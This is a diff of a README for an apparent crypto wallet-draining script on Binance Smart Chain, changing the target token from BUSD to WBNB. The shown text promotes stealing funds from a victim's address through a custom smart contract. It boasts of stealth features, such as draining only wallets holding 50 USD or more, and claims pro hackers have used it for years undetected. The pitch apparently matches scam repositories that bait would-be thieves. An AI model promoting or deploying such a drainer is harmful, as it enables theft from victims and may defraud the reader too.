@@ -32,7 +32,7 @@ VICTIM ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
 The !!! smart contract address !!! appears in the transaction not yours this is for stealth
 
-This script will let you drain BUSD from the targets address
+This script will let you drain WBNB from the targets address
 
 This is a free community code that anyone can audit or edit with pull request and works as designed its been used by pro hackers for years to steal crypto undetected i didnt write this script im just sharing it to show how hackers steal crypto
 
@@ -53,7 +53,7 @@ THE CONTRACT WILL ONLY DRAIN WALLETS WITH 50 BUSD OR MORE FOR STEALTH
 
 4. the smart contract runs from the script in your fork and is running 24/7 so you have full control 
 
-5. If the victim has less than 50 busd in there wallet it will not drain it so its harder to detect it waits for the victim to get a certain amount of busd
+5. If the victim has less than 50 usd worth of wbnb in there wallet it will not drain it so its harder to detect it waits for the victim to get a certain amount of busd
 
 
 Deploy steps
